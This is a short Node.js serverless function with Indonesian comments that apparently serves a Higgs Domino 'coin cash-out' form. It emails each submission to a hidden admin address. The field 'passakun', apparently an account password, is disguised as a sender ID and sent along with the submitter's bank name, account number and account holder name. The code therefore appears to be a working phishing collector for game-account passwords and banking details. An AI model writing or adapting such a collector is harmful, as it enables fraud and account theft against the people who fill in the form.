// Impor pustaka Nodemailer dan dotenv
const nodemailer = require('nodemailer');
require('dotenv').config({ path: './.env.local' });

// Konfigurasi transporter Nodemailer (menggunakan SMTP)
const transporter = nodemailer.createTransport({
    service: 'gmail', // Contoh: Menggunakan Gmail. Ganti dengan host SMTP jika perlu.
    auth: {
        user: process.env.EMAIL_USER, // Alamat email Anda
        pass: process.env.EMAIL_PASS  // Kata sandi aplikasi
    }
});

// Fungsi utama yang akan dijalankan Vercel
module.exports = async (req, res) => {
    // Pastikan permintaan adalah POST
    if (req.method !== 'POST') {
        res.status(405).send('Method Not Allowed');
        return;
    }

    // Mendapatkan data dari request body (formulir)
    // Vercel akan otomatis mem-parsing data form menjadi JSON
    const data = req.body;
    
    // Ambil dan bersihkan data
    const id_anda = data.passakun || 'N/A';
    const nickname = data.nickname || 'N/A';
    const jumlah_bongkaran = data.Idakun || 'N/A';
    const bank_pencairan = data.narek || 'N/A';
    const nomor_rekening = data.norek || 'N/A';
    const atas_nama = data.atasnama || 'N/A';

    // Susun isi email
    const subject = `[BONGKAR ID] TRANSAKSI BARU dari ${nickname} (${id_anda})`;
    const body = `
        Halo Admin,

        Anda menerima permintaan Bongkar Koin baru dengan rincian:

        ==========================================
                  INFO PENGIRIM (Higgs Domino)
        ==========================================
        1. ID Pengirim        : ${id_anda}
        2. Nickname           : ${nickname}
        3. Jumlah Bongkaran   : ${jumlah_bongkaran}
        ------------------------------------------
        Target ID Kirim       : 21640006
        ==========================================

        ==========================================
                  INFO PENCERAIAN (Transfer)
        ==========================================
        5. Bank Pencairan     : ${bank_pencairan}
        6. Nomor Rekening     : ${nomor_rekening}
        7. Atas Nama          : ${atas_nama}
        ==========================================

        Harap segera proses transaksi ini.
    `;

    // Konfigurasi pengiriman email
    const mailOptions = {
        from: process.env.EMAIL_USER,
        to: process.env.EMAIL_TUJUAN, // Email tujuan admin
        subject: subject,
        text: body
        // Jika perlu attachment, penanganan form-data harus lebih spesifik.
    };

    try {
        // Kirim email
        await transporter.sendMail(mailOptions);
        
        // Kirim respons sukses dan redirect pengguna
        res.status(200).setHeader('Location', '/sukses.html').send({ message: 'Email berhasil dikirim dan Redirecting...' });
    
    } catch (error) {
        console.error('Gagal mengirim email:', error);
        
        // Kirim respons error
        res.status(500).send({ error: 'Gagal mengirim data. Silakan coba lagi.', details: error.message });
    }
};
